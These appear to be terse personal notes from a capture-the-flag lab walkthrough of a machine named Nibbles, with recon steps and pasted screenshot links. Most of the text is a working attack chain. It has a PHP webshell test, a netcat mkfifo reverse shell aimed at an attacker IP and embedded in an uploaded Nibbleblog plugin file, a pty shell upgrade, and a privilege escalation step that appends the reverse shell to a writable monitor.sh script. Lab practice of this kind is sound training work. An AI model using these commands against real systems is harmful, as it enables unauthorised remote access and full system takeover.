1. scan
nmap -sC -sV 10.129.13.161
![[Pasted image 20251118081749.png]]

curl port 80
![[Pasted image 20251118081830.png]]

gobuster on root
![[Pasted image 20251118082258.png]]
go buster on the directory in the code comments
![[Pasted image 20251118082403.png]]

test code snippet
```php
<?php system('id'); ?>
```

reverse shell
```shell-session
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKING IP> <LISTENING PORT) >/tmp/f
```

combo 

```php
<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.141 8008 >/tmp/f
'); ?>
```



```shell-session
curl http://10.129.42.190/nibbleblog/content/private/plugins/my_image/image.php
```


```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```


```shell-session
nibbler@Nibbles:/home/nibbler/personal/stuff$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.141 8443 >/tmp/f' | tee -a monitor.sh
```